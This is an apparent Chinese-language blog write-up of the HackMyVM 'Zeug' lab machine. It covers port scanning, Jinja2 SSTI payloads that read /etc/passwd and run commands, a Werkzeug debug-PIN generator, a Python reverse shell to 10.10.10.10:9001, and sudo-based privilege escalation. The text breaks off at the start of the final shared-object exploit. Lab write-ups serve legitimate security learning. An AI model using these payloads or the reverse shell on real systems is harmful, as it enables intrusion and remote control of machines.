<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HMV-Zeug - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="
打个靶机
" />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="HMV-Zeug" />
<meta property="og:description" content="
打个靶机
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/hmv-zeug/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-02-22T00:00:00+00:00" />
<meta property="article:modified_time" content="2024-02-22T00:00:00+00:00" />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="HMV-Zeug"/>
<meta name="twitter:description" content="
打个靶机
"/>
<script src="http://localhost:1313/js/feather.min.js"></script>
	
	
        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
	

	
	
		<script type="text/javascript"
		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
		</script>

		
		<script type="text/x-mathjax-config">
		MathJax.Hub.Config({
			tex2jax: {
				inlineMath: [['$','$'], ['\\(','\\)']],
				displayMath: [['$$','$$'], ['\[','\]']],
				processEscapes: true,
				processEnvironments: true,
				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
				TeX: { equationNumbers: { autoNumber: "AMS" },
						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
			}
		});
		</script>
	

	
	
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>

		
		<script>
			document.addEventListener("DOMContentLoaded", function() {
					renderMathInElement(document.body, {
							delimiters: [
									{left: "$$", right: "$$", display: true},
									{left: "$", right: "$", display: false}
							]
					});
			});
			</script>
	

	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="http://localhost:1313/">ldrx30</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/about">About</a>
		
		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
		<script src="http://localhost:1313/js/themetoggle.js"></script>
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">HMV-Zeug</h1>
			<div class="meta">Posted on Feb 22, 2024</div>
		</div>
		

		

		<section class="body">
			<blockquote>
<p>打个靶机</p>
</blockquote>
<h2 id="扫描">扫描</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -p- --min-rate<span style="color:#ff79c6">=</span><span style="color:#bd93f9">10000</span> &lt;IP&gt;
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 192.168.124.6
</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff79c6">(</span>0.0012s latency<span style="color:#ff79c6">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#bd93f9">65533</span> closed tcp ports <span style="color:#ff79c6">(</span>reset<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
</span></span><span style="display:flex;"><span>21/tcp   open  ftp
</span></span><span style="display:flex;"><span>5000/tcp open  upnp
</span></span><span style="display:flex;"><span>MAC Address: 08:00:27:8D:5E:6D <span style="color:#ff79c6">(</span>Oracle VirtualBox virtual NIC<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Nmap done at Thu Feb 22 10:23:52 2024 -- 1 IP address (1 host up) scanned in 66.37 seconds</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ <span style="color:#8be9fd;font-style:italic">$sudo</span> nmap -p21,5000 -sCV &lt;IP&gt;
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># ...</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>21/tcp   open  ftp     vsftpd 3.0.3
</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#ff79c6">(</span>FTP code 230<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>|_-rw-r--r--    <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">0</span>        <span style="color:#bd93f9">0</span>             <span style="color:#bd93f9">109</span> Jan <span style="color:#bd93f9">06</span> 23:14 README.txt
</span></span><span style="display:flex;"><span>| ftp-syst: 
</span></span><span style="display:flex;"><span>|   STAT: 
</span></span><span style="display:flex;"><span>| FTP server status:
</span></span><span style="display:flex;"><span>|      Connected to ::ffff:192.168.124.13
</span></span><span style="display:flex;"><span>|      Logged in as ftp
</span></span><span style="display:flex;"><span>|      TYPE: ASCII
</span></span><span style="display:flex;"><span>|      No session bandwidth limit
</span></span><span style="display:flex;"><span>|      Session timeout in seconds is <span style="color:#bd93f9">300</span>
</span></span><span style="display:flex;"><span>|      Control connection is plain text
</span></span><span style="display:flex;"><span>|      Data connections will be plain text
</span></span><span style="display:flex;"><span>|      At session startup, client count was <span style="color:#bd93f9">3</span>
</span></span><span style="display:flex;"><span>|      vsFTPd 3.0.3 - secure, fast, stable
</span></span><span style="display:flex;"><span>|_End of status
</span></span><span style="display:flex;"><span>5000/tcp open  upnp?
</span></span><span style="display:flex;"><span>| fingerprint-strings: 
</span></span><span style="display:flex;"><span>|   GetRequest: 
</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#bd93f9">200</span> OK
</span></span><span style="display:flex;"><span>|     Server: Werkzeug/3.0.1 Python/3.11.2
</span></span><span style="display:flex;"><span>|     Date: Thu, <span style="color:#bd93f9">22</span> Feb <span style="color:#bd93f9">2024</span> 05:56:24 GMT
</span></span><span style="display:flex;"><span>|     Content-Type: text/html; <span style="color:#8be9fd;font-style:italic">charset</span><span style="color:#ff79c6">=</span>utf-8
</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#bd93f9">549</span>
</span></span><span style="display:flex;"><span>|     Connection: close
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># ...</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Unix
</span></span></code></pre></div><h2 id="ftp">ftp</h2>
<p>anonymous 登录，获得README文件</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>ftp&gt; get README.md
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ cat README.txt
</span></span><span style="display:flex;"><span>Hi, Cosette, don&#39;t forget to disable the debug mode in the web application, we don&#39;t want security breaches.
</span></span></code></pre></div><h2 id="werkzeug-web">Werkzeug WEB</h2>
<h3 id="debug">DEBUG</h3>
<p>结合提示，可能是DEBUG模式。访问 <code>/console</code> 路由，但是需要 <code>PIN</code></p>
<h3 id="ssti">SSTI</h3>
<p>文件上传，上传html文件解析，但是存在 <code>SSTI</code>，<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection">PayloadsAllTheThings</a></p>
<p>网站设置了黑名单</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{config<span style="color:#ff79c6">.</span>items()}}
</span></span><span style="display:flex;"><span>{{ []<span style="color:#ff79c6">.</span>class<span style="color:#ff79c6">.</span>base<span style="color:#ff79c6">.</span>subclasses() }}  <span style="color:#6272a4"># [] subclasses</span>
</span></span><span style="display:flex;"><span>{{ self<span style="color:#ff79c6">.</span>__init__<span style="color:#ff79c6">.</span>__globals__<span style="color:#ff79c6">.</span>__builtins__ }}  <span style="color:#6272a4"># init</span>
</span></span><span style="display:flex;"><span>{{ get_flashed_messages<span style="color:#ff79c6">.</span>__globals__<span style="color:#ff79c6">.</span>__builtins__<span style="color:#ff79c6">.</span>open(<span style="color:#f1fa8c">&#34;/etc/passwd&#34;</span>)<span style="color:#ff79c6">.</span>read() }}
</span></span><span style="display:flex;"><span>{{ lipsum<span style="color:#ff79c6">.</span>__globals__[<span style="color:#f1fa8c">&#34;os&#34;</span>]<span style="color:#ff79c6">.</span>popen(<span style="color:#f1fa8c">&#39;id&#39;</span>)<span style="color:#ff79c6">.</span>read() }}  <span style="color:#6272a4"># os popen</span>
</span></span></code></pre></div><h3 id="pin码">PIN码</h3>
<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug">Werkzeug / Flask Debug - HackTricks</a></p>
<p>结合源码，其计算machin_id 的当时</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_machine_id</span>() <span style="color:#ff79c6">-&gt;</span> <span style="color:#8be9fd;font-style:italic">str</span> <span style="color:#ff79c6">|</span> <span style="color:#8be9fd;font-style:italic">bytes</span> <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">None</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">global</span> _machine_id
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> _machine_id <span style="color:#ff79c6">is</span> <span style="color:#ff79c6">not</span> <span style="color:#ff79c6">None</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> _machine_id
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_generate</span>() <span style="color:#ff79c6">-&gt;</span> <span style="color:#8be9fd;font-style:italic">str</span> <span style="color:#ff79c6">|</span> <span style="color:#8be9fd;font-style:italic">bytes</span> <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">None</span>:
</span></span><span style="display:flex;"><span>        linux <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># machine-id is stable across boots, boot_id is not.</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> filename <span style="color:#ff79c6">in</span> <span style="color:#f1fa8c">&#34;/etc/machine-id&#34;</span>, <span style="color:#f1fa8c">&#34;/proc/sys/kernel/random/boot_id&#34;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">try</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(filename, <span style="color:#f1fa8c">&#34;rb&#34;</span>) <span style="color:#ff79c6">as</span> f:
</span></span><span style="display:flex;"><span>                    value <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">.</span>readline()<span style="color:#ff79c6">.</span>strip()
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">except</span> OSError:
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> value:
</span></span><span style="display:flex;"><span>                linux <span style="color:#ff79c6">+=</span> value
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;/proc/self/cgroup&#34;</span>, <span style="color:#f1fa8c">&#34;rb&#34;</span>) <span style="color:#ff79c6">as</span> f:
</span></span><span style="display:flex;"><span>                linux <span style="color:#ff79c6">+=</span> f<span style="color:#ff79c6">.</span>readline()<span style="color:#ff79c6">.</span>strip()<span style="color:#ff79c6">.</span>rpartition(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/&#34;</span>)[<span style="color:#bd93f9">2</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">except</span> OSError:
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">pass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> linux:
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> linux
</span></span></code></pre></div><ol>
<li>Username. <code>/etc/passwd : cosette</code></li>
<li>Full path of the app. <code>/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py</code></li>
<li>MAC address of the target machine. <code>/sys/class/net/enp0s3/address =&gt; 08:00:27:8d:5e:6d =&gt; 8796756598381</code></li>
<li>Machine ID : <code>/etc/machine-id=&gt;48329e233f524ec291cce7479927890b</code> &amp;&amp; <code>/proc/sys/kernel/random/boot_id=&gt;901d0a34-e4f9-4a52-8a83-3840d0c0bfb1</code> &amp;&amp; <code>/proc/self/cgroup=&gt;0::/system.slice/zeug-app.service</code>).</li>
</ol>
<p>计算PIN码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> hashlib
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> itertools <span style="color:#ff79c6">import</span> chain
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>probably_public_bits <span style="color:#ff79c6">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;cosette&#39;</span>,  <span style="color:#6272a4"># username</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;flask.app&#39;</span>,  <span style="color:#6272a4"># modname</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;Flask&#39;</span>,  <span style="color:#6272a4"># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py&#39;</span>  <span style="color:#6272a4"># getattr(mod, &#39;__file__&#39;, None),</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>private_bits <span style="color:#ff79c6">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;8796756598381&#39;</span>,  
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;48329e233f524ec291cce7479927890bzeug-app.service&#39;</span>  
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0</span>
</span></span><span style="display:flex;"><span>h <span style="color:#ff79c6">=</span> hashlib<span style="color:#ff79c6">.</span>sha1()
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> bit <span style="color:#ff79c6">in</span> chain(probably_public_bits, private_bits):
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> bit:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">continue</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">isinstance</span>(bit, <span style="color:#8be9fd;font-style:italic">str</span>):
</span></span><span style="display:flex;"><span>        bit <span style="color:#ff79c6">=</span> bit<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>)
</span></span><span style="display:flex;"><span>    h<span style="color:#ff79c6">.</span>update(bit)
</span></span><span style="display:flex;"><span>h<span style="color:#ff79c6">.</span>update(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;cookiesalt&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># h.update(b&#39;shittysalt&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cookie_name <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;__wzd&#39;</span> <span style="color:#ff79c6">+</span> h<span style="color:#ff79c6">.</span>hexdigest()[:<span style="color:#bd93f9">20</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>num <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">None</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> num <span style="color:#ff79c6">is</span> <span style="color:#ff79c6">None</span>:
</span></span><span style="display:flex;"><span>    h<span style="color:#ff79c6">.</span>update(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;pinsalt&#39;</span>)
</span></span><span style="display:flex;"><span>    num <span style="color:#ff79c6">=</span> (<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">%09d</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">%</span> <span style="color:#8be9fd;font-style:italic">int</span>(h<span style="color:#ff79c6">.</span>hexdigest(), <span style="color:#bd93f9">16</span>))[:<span style="color:#bd93f9">9</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rv <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">None</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> rv <span style="color:#ff79c6">is</span> <span style="color:#ff79c6">None</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> group_size <span style="color:#ff79c6">in</span> <span style="color:#bd93f9">5</span>, <span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">3</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(num) <span style="color:#ff79c6">%</span> group_size <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>:
</span></span><span style="display:flex;"><span>            rv <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;-&#39;</span><span style="color:#ff79c6">.</span>join(num[x:x <span style="color:#ff79c6">+</span> group_size]<span style="color:#ff79c6">.</span>rjust(group_size, <span style="color:#f1fa8c">&#39;0&#39;</span>)
</span></span><span style="display:flex;"><span>                          <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">len</span>(num), group_size))
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>        rv <span style="color:#ff79c6">=</span> num
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(rv)
</span></span></code></pre></div><p>然后得到PIN码，进入DEBUG终端，使用python reverse shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> socket<span style="color:#ff79c6">,</span>subprocess<span style="color:#ff79c6">,</span>os;s<span style="color:#ff79c6">=</span>socket<span style="color:#ff79c6">.</span>socket(socket<span style="color:#ff79c6">.</span>AF_INET,socket<span style="color:#ff79c6">.</span>SOCK_STREAM);s<span style="color:#ff79c6">.</span>connect((<span style="color:#f1fa8c">&#34;10.10.10.10&#34;</span>,<span style="color:#bd93f9">9001</span>));os<span style="color:#ff79c6">.</span>dup2(s<span style="color:#ff79c6">.</span>fileno(),<span style="color:#bd93f9">0</span>); os<span style="color:#ff79c6">.</span>dup2(s<span style="color:#ff79c6">.</span>fileno(),<span style="color:#bd93f9">1</span>);os<span style="color:#ff79c6">.</span>dup2(s<span style="color:#ff79c6">.</span>fileno(),<span style="color:#bd93f9">2</span>);<span style="color:#ff79c6">import</span> pty; pty<span style="color:#ff79c6">.</span>spawn(<span style="color:#f1fa8c">&#34;sh&#34;</span>)
</span></span></code></pre></div><p>升级pty</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#f1fa8c">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">(</span>inside the nc session<span style="color:#ff79c6">)</span> 
</span></span><span style="display:flex;"><span>CTRL+Z
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>stty raw -echo; fg; ls; <span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">SHELL</span><span style="color:#ff79c6">=</span>/bin/bash; <span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">TERM</span><span style="color:#ff79c6">=</span>screen; stty rows <span style="color:#bd93f9">38</span> columns 116; reset;
</span></span></code></pre></div><h2 id="权限提升">权限提升</h2>
<p>可以执行seed程序</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cosette@zeug:~$ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#ff79c6">for</span> cosette on zeug:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin,
</span></span><span style="display:flex;"><span>    use_pty
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User cosette may run the following commands on zeug:
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">(</span>exia<span style="color:#ff79c6">)</span> NOPASSWD: /home/exia/seed
</span></span></code></pre></div><p>seed_bak: 备份，这里是个伪随机数，v5是个固定值<code>0x6b8b4567</code>，因此我们可以明确的得到答案</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">int</span> argc, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>argv, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> v4; <span style="color:#6272a4">// [rsp+Ch] [rbp-14h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> v5; <span style="color:#6272a4">// [rsp+10h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> v6; <span style="color:#6272a4">// [rsp+14h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v7; <span style="color:#6272a4">// [rsp+18h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  v7 <span style="color:#ff79c6">=</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
</span></span><span style="display:flex;"><span>  banner(argc, argv, envp);
</span></span><span style="display:flex;"><span>  srand(<span style="color:#bd93f9">1u</span>);
</span></span><span style="display:flex;"><span>  v5 <span style="color:#ff79c6">=</span> rand();
</span></span><span style="display:flex;"><span>  v6 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xDEADBEEF</span>;
</span></span><span style="display:flex;"><span>  v4 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;Enter a number: &#34;</span>);
</span></span><span style="display:flex;"><span>  __isoc99_scanf(<span style="color:#f1fa8c">&#34;%d&#34;</span>, <span style="color:#ff79c6">&amp;</span>v4);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( v6 <span style="color:#ff79c6">==</span> (v5 <span style="color:#ff79c6">^</span> v4) )
</span></span><span style="display:flex;"><span>    system(<span style="color:#f1fa8c">&#34;/bin/bash&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>    puts(<span style="color:#f1fa8c">&#34;Wrong.&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>然后输入密码获得shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -u exia /home/exia/seed
</span></span></code></pre></div><p>提权到root</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>exia@<span style="color:#8be9fd;font-style:italic">zeug</span>:<span style="color:#ff79c6">/</span>dev<span style="color:#ff79c6">/</span>shm$ sudo <span style="color:#ff79c6">-</span>l
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#ff79c6">for</span> exia on <span style="color:#8be9fd;font-style:italic">zeug</span>:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
</span></span><span style="display:flex;"><span>    secure_path<span style="color:#ff79c6">=/</span>usr<span style="color:#ff79c6">/</span>local<span style="color:#ff79c6">/</span>sbin\<span style="color:#ff79c6">:/</span>usr<span style="color:#ff79c6">/</span>local<span style="color:#ff79c6">/</span>bin\<span style="color:#ff79c6">:/</span>usr<span style="color:#ff79c6">/</span>sbin\<span style="color:#ff79c6">:/</span>usr<span style="color:#ff79c6">/</span>bin\<span style="color:#ff79c6">:/</span>sbin\<span style="color:#ff79c6">:/</span>bin,
</span></span><span style="display:flex;"><span>    use_pty
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User exia may run the following commands on <span style="color:#8be9fd;font-style:italic">zeug</span>:
</span></span><span style="display:flex;"><span>    (root) <span style="color:#8be9fd;font-style:italic">NOPASSWD</span>: <span style="color:#ff79c6">/</span>usr<span style="color:#ff79c6">/</span>bin<span style="color:#ff79c6">/</span>zeug
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__fastcall</span> main(<span style="color:#8be9fd">int</span> argc, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>argv, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( dlopen(<span style="color:#f1fa8c">&#34;/home/exia/exia.so&#34;</span>, <span style="color:#bd93f9">2</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>  fwrite(<span style="color:#f1fa8c">&#34;Error opening file</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#bd93f9">1uLL</span>, <span style="color:#bd93f9">0x13uLL</span>, _bss_start);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>dlopen ：<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path">Linux Privilege Escalation</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">// gcc -fPIC -shared -o pe.so pe.c -nostartfiles
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// sudo -u root /usr/bin/zeug
